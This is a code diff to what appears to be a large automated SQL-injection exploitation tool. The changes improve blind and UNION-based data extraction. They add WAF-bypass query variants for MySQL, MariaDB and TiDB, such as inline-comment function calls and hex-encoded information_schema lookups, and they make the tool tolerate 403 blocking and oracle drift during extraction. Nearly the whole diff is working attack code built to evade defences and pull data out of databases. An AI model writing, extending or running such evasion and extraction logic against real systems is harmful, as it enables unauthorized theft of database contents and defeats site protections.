@@ -32509,12 +32509,23 @@ class GlobalRequestGate:
                         print(f"    Halting ALL requests for {circuit_pause}s (5 min)", flush=True)
 
 
-            elif status_code == 403 and self._consecutive_fail >= 3:
-                old_delay = self._delay
-                self._delay = min(self._max_delay, self._delay * 2 + 0.5)
-                self._paused_until = time.monotonic() + 10 + random.uniform(0, 5)
+            elif status_code == 403:
+                # BUG-CB-403-FALLTHROUGH FIX: Previously 403s with _consecutive_fail < 3
+                # fell through to the success handler (else branch), incrementing
+                # _consecutive_ok and decrementing _consecutive_fail.  A WAF that uniformly
+                # blocks all oracle probes with 403 was therefore scored as "successful"
+                # requests — the circuit breaker never opened and _consecutive_ok climbed
+                # while _consecutive_fail stayed near 0.  Fix: always treat 403 as a soft
+                # error (resets _consecutive_ok, increments _consecutive_fail) to ensure
+                # prolonged 403 storms trigger the circuit breaker.  The delay/pause backoff
+                # is only applied when _consecutive_fail >= 3 (existing escalation logic).
                 self._consecutive_ok = 0
-                print(f"[!] [Gate] Repeated 403s  delay {old_delay:.1f}{self._delay:.1f}s, pausing 10s", flush=True)
+                self._consecutive_fail += 1
+                if self._consecutive_fail >= 3:
+                    old_delay = self._delay
+                    self._delay = min(self._max_delay, self._delay * 2 + 0.5)
+                    self._paused_until = time.monotonic() + 10 + random.uniform(0, 5)
+                    print(f"[!] [Gate] Repeated 403s  delay {old_delay:.1f}→{self._delay:.1f}s, pausing 10s", flush=True)
 
             elif error:
                 self._consecutive_ok = 0
@@ -63701,6 +63712,25 @@ class Scanner:
                                 "blocking confirmed for equality probes; aborting scan.",
                                 p, _val, _complement_val)
                             return None
+                        # RC8-EXT FIX (CRITICAL): When complement probe returns None AND
+                        # _fe_seen_false is empty (no WAF-safe False baseline established
+                        # yet), we cannot distinguish a genuine True match from WAF-uniform
+                        # blocking where ordinal 0 is also ambiguous.  Returning chr(_val)
+                        # here produces 'a' for every position when WAF blocks all equality
+                        # probes uniformly (complement=0 \u2192 None, no known-safe values yet).
+                        # Fix: defer to the ambiguous list and continue scanning.  If _val
+                        # truly is the correct character, all remaining candidates will return
+                        # False (confirming _val as the sole ambiguous = real match), and the
+                        # single-ambiguous resolution path returns it correctly.  If WAF is
+                        # uniform, multiple candidates end up ambiguous and the scanner aborts.
+                        if _comp_r is None and not _fe_seen_false:
+                            LOG.debug(
+                                "[Inference] pos=%d equality: match val=%d but complement "
+                                "(val=%d, no WAF-safe baseline) returned None \u2014 "
+                                "deferring to ambiguous list (cannot confirm vs. WAF-uniform).",
+                                p, _val, _complement_val)
+                            _fe_ambiguous.append(_val)
+                            continue
                         LOG.info("[Inference] pos=%d equality \u2192 %r (val=%d)", p, chr(_val), _val)
                         return chr(_val)
                     # RC8-FIX: record this value as WAF-safe, SQL-False for complement reuse
@@ -65153,10 +65183,23 @@ class Scanner:
                 "YugabyteDB":  ["SELECT current_role", "SELECT user", "SELECT current_user"],
                 "Amazon Redshift": ["SELECT current_user", "SELECT user"],
                 "MySQL":    ["SELECT SUBSTRING_INDEX(USER(),'@',1)",
-                             "SELECT user()", "SELECT current_user()"],
+                             "SELECT user()", "SELECT current_user()",
+                             # BUG-R7-USER-WAF-EVASION FIX: Fastly/Imperva WAFs
+                             # pattern-match on 'USER()' and 'current_user()' function
+                             # call syntax, blocking all length and char probes so the
+                             # oracle dies before returning any data.  Alternatives:
+                             # CURRENT_USER (keyword form, no parens) is a MySQL synonym
+                             # that bypasses function-call WAF patterns.  Inline comment
+                             # after USER breaks literal 'USER()' signature matching.
+                             # SUBSTRING_INDEX on CURRENT_USER avoids outer USER() call.
+                             "SELECT CURRENT_USER",
+                             "SELECT USER/**/()"],
                 "MariaDB":  ["SELECT SUBSTRING_INDEX(USER(),'@',1)",
-                             "SELECT user()", "SELECT current_user()"],
-                "TiDB":     ["SELECT user()", "SELECT current_user()"],
+                             "SELECT user()", "SELECT current_user()",
+                             "SELECT CURRENT_USER",
+                             "SELECT USER/**/()"],
+                "TiDB":     ["SELECT user()", "SELECT current_user()",
+                             "SELECT CURRENT_USER"],
                 "MSSQL":    ["SELECT SYSTEM_USER", "SELECT USER_NAME()", "SELECT ORIGINAL_LOGIN()"],
                 "Sybase":   ["SELECT SUSER_NAME()", "SELECT user_name()"],
                 "Oracle":   ["SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM dual",
@@ -65173,9 +65216,24 @@ class Scanner:
                 "CockroachDB": ["SELECT current_catalog", "SELECT current_database()"],
                 "YugabyteDB":  ["SELECT current_catalog", "SELECT current_database()"],
                 "Amazon Redshift": ["SELECT current_database()"],
-                "MySQL":    ["SELECT database()", "SELECT schema()"],
-                "MariaDB":  ["SELECT database()", "SELECT schema()"],
-                "TiDB":     ["SELECT database()"],
+                "MySQL":    ["SELECT database()", "SELECT schema()",
+                             # BUG-R7-DB-WAF-EVASION FIX: WAF blocks 'database()' and
+                             # 'schema()' function call patterns.  Inline comment breaks
+                             # literal function-name signature matching.  information_schema
+                             # query avoids all blocked function names entirely.
+                             "SELECT DATABASE/**/()",
+                             "(SELECT schema_name FROM information_schema.SCHEMATA "
+                             "WHERE schema_name!=0x696e666f726d6174696f6e5f736368656d61 "
+                             "AND schema_name!=0x6d7973716c "
+                             "AND schema_name!=0x706572666f726d616e63655f736368656d61 "
+                             "ORDER BY schema_name LIMIT 1)"],
+                "MariaDB":  ["SELECT database()", "SELECT schema()",
+                             "SELECT DATABASE/**/()",
+                             "(SELECT schema_name FROM information_schema.SCHEMATA "
+                             "WHERE schema_name!=0x696e666f726d6174696f6e5f736368656d61 "
+                             "AND schema_name!=0x6d7973716c "
+                             "ORDER BY schema_name LIMIT 1)"],
+                "TiDB":     ["SELECT database()", "SELECT DATABASE/**/()"],
                 "MSSQL":    ["SELECT DB_NAME()", "SELECT ORIGINAL_DB_NAME()"],
                 "Sybase":   ["SELECT DB_NAME()"],
                 "Oracle":   ["SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"],
@@ -126417,6 +126475,29 @@ class TechniqueCascadeEngine:
                             original + payload, self.tamper_chain)
                     except Exception:
                         pass
+                    # BUG-UH-UNION-COLUMNS FIX (CRITICAL): UH DetectionResult was created
+                    # without union_columns, so _union_extract_data immediately failed with
+                    # "No union_columns found" for ALL UH detections.  Parse the column
+                    # count from the detection payload here (same logic as regular U at
+                    # line ~41791) so extraction can proceed without re-scanning columns.
+                    try:
+                        _uh_um = _re.search(
+                            r'UNION\s+(?:ALL\s+)?SELECT\s+(.*?)(?:\s*--|#|/\*|$)',
+                            payload, _re.I | _re.S)
+                        if _uh_um is None:
+                            _uh_pay_clean = _re.sub(r'/\*[^*]*\*/', ' ', payload)
+                            _uh_um = _re.search(
+                                r'UNION\s+(?:ALL\s+)?SELECT\s+(.*?)(?:\s*--|#|$)',
+                                _uh_pay_clean, _re.I | _re.S)
+                        if _uh_um:
+                            _uh_cols = _split_sql_cols(_uh_um.group(1))
+                            _det_uh.union_columns = len(_uh_cols)
+                            for _uh_ci, _uh_cv in enumerate(_uh_cols):
+                                if (_uh_cv or "").strip().upper() not in ('NULL', '0', '1', "''") and len((_uh_cv or "").strip()) > 1:
+                                    _det_uh.injectable_col = _uh_ci
+                                    break
+                    except Exception:
+                        pass
                     return _det_uh
             # Also check for SQL errors in UH (cross-technique detection)
             if not _validate_response(fp, func_name="waf_block_check"): return None  # BUG-FIX-SYNTAX: continue→return None
@@ -126463,6 +126544,25 @@ class TechniqueCascadeEngine:
                                 try:
                                     _det_uh_e.exact_sent_payload = DetectionResult.compute_exact_payload(
                                         original + payload, self.tamper_chain)
+                                except Exception:
+                                    pass
+                                # BUG-UH-UNION-COLUMNS FIX: same column-count parse as union_body path above
+                                try:
+                                    _uh_e_um = _re.search(
+                                        r'UNION\s+(?:ALL\s+)?SELECT\s+(.*?)(?:\s*--|#|/\*|$)',
+                                        payload, _re.I | _re.S)
+                                    if _uh_e_um is None:
+                                        _uh_e_pay_c = _re.sub(r'/\*[^*]*\*/', ' ', payload)
+                                        _uh_e_um = _re.search(
+                                            r'UNION\s+(?:ALL\s+)?SELECT\s+(.*?)(?:\s*--|#|$)',
+                                            _uh_e_pay_c, _re.I | _re.S)
+                                    if _uh_e_um:
+                                        _uh_e_cols = _split_sql_cols(_uh_e_um.group(1))
+                                        _det_uh_e.union_columns = len(_uh_e_cols)
+                                        for _uh_ei2, _uh_ev in enumerate(_uh_e_cols):
+                                            if (_uh_ev or "").strip().upper() not in ('NULL', '0', '1', "''") and len((_uh_ev or "").strip()) > 1:
+                                                _det_uh_e.injectable_col = _uh_ei2
+                                                break
                                 except Exception:
                                     pass
                                 return _det_uh_e
@@ -147565,6 +147665,27 @@ class MultiStrategyExtractor:
             print(f"[MSE] batch {batch_start}-{batch_end}: {current!r}", flush=True)
 
         final = "".join(result).rstrip("\x00").rstrip()
+        # BUG-MSE-ORACLE-DRIFT-GARBAGE FIX: MSE probe_all validates the oracle once
+        # at startup (checking that true/false conditions produce distinct responses).
+        # WAFs adapt during extraction: after N requests they begin treating ALL probes
+        # identically (both true/false SQL conditions return 200+2430B).  The oracle
+        # drifts to non-functional but stays in self._oracles, producing garbage BMP
+        # characters (e.g. 'ᙩ'=U+1669, 'ӫ'=U+04EB) that are not caught by the
+        # supplementary-plane check (they're BMP, not > U+FFFF).
+        # Fix: before returning, run one final oracle sanity check.  If the oracle
+        # can no longer distinguish always-true from always-false, treat the extracted
+        # string as garbage and return "" to trigger fallback to another technique.
+        if final:
+            try:
+                _drift_true  = await self.eval_condition("1=1")
+                _drift_false = await self.eval_condition("1=2")
+                if _drift_true is not None and _drift_false is not None and _drift_true == _drift_false:
+                    print(f"[MSE] Oracle drift detected after extraction "
+                          f"(1=1→{_drift_true}, 1=2→{_drift_false}): discarding "
+                          f"result {final!r} as unreliable", flush=True)
+                    return ""
+            except Exception:
+                pass
         print(f"[MSE] Parallel result: {final!r}", flush=True)
         return final
 
@@ -168510,6 +168631,51 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
     except Exception as _sel_mask_exc:
         LOG.debug("[Novel] %s: selective-mask sanity error (non-fatal): %s",
                   label, _sel_mask_exc)
+    await asyncio.sleep(delay * 0.3)
+
+    # RC5-FIX-EXT: Complementary sanity check for WAF blocking &mask=mask (the exact
+    # extraction pattern).  The previous &8=1 check detects WAFs that block ALL bitmask
+    # conditions but misses WAFs that selectively block only "mask=mask" equality —
+    # i.e. conditions where the AND-mask equals the comparison value (&8=8, &2048=2048,
+    # &524288=524288).  These are the patterns used during actual bit extraction.
+    # Observed in production: &8=1 sanity passed (WAF allowed mask≠value comparison)
+    # but actual extraction of &8=8, &2048=2048, &524288=524288 was blocked → bits
+    # 3, 11, 19 forced True → char_val=526344=chr(0x80808) for every position.
+    # Detection: evaluate a constant SQL expression 0&8=8 that is ALWAYS False in SQL
+    # (0 AND 8 = 0 ≠ 8).  Oracle True → WAF is blocking the &mask=mask pattern used in
+    # extraction.  Oracle None → ambiguous, treat as blocked.  Oracle False → safe.
+    try:
+        if dbms == "Oracle":
+            _mem_cond = "BITAND(0,8)=8"
+        elif dbms == "Firebird":
+            _mem_cond = "BIN_AND(0,8)=8"
+        elif dbms in ("DB2",):
+            _mem_cond = "BITAND(0,8)=8"
+        elif dbms == "ClickHouse":
+            _mem_cond = "bitAnd(0,8)=8"
+        else:
+            _mem_cond = "0&8=8"
+        _mem_r = await eval_fn(_mem_cond)
+        if _mem_r is True:
+            LOG.warning(
+                "[Novel] %s: mask=value sanity FAILED (constant 0&8=8 → True). "
+                "WAF selectively blocks '&mask=mask' patterns used in bitwise "
+                "extraction (&8=8, &2048=2048, &524288=524288). Bits 3/11/19 would "
+                "be forced True → char_val=526344=chr(0x80808) garbage for every "
+                "position. Aborting.", label)
+            print(f"[Novel] {label}: WAF blocks &mask=mask extraction patterns "
+                  "(0&8=8→True) — aborting bitwise extraction to prevent 0x80808 "
+                  "garbage", flush=True)
+            return ""
+        elif _mem_r is None:
+            LOG.warning(
+                "[Novel] %s: mask=value sanity ambiguous (constant 0&8=8 → None). "
+                "WAF may selectively block &mask=mask extraction patterns — "
+                "aborting to prevent garbled extraction.", label)
+            return ""
+    except Exception as _mem_exc:
+        LOG.debug("[Novel] %s: mask=value sanity error (non-fatal): %s",
+                  label, _mem_exc)
     await asyncio.sleep(delay * 0.3)
 
     # Extract chars
